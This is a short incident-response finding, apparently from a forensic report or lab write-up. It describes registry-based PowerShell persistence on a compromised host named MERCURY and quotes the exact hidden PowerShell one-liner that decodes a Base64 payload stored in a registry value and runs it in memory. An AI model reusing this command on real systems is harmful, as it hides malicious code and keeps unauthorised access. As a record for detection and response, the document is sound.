Persistence was established on the compromised host MERCURY through a registry-based PowerShell backdoor.

A hidden PowerShell command was executed that retrieved and decoded a Base64-encoded payload stored in the registry key:

HKLM\Software\Microsoft\Network\debug

The command executed was:

powershell.exe -NoN -W hidden -c IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))

This technique allowed the attacker to maintain persistent access by storing the malicious script in the Windows registry and executing it in memory.

Affected host: MERCURY  
Persistence type: Registry-based PowerShell backdoor
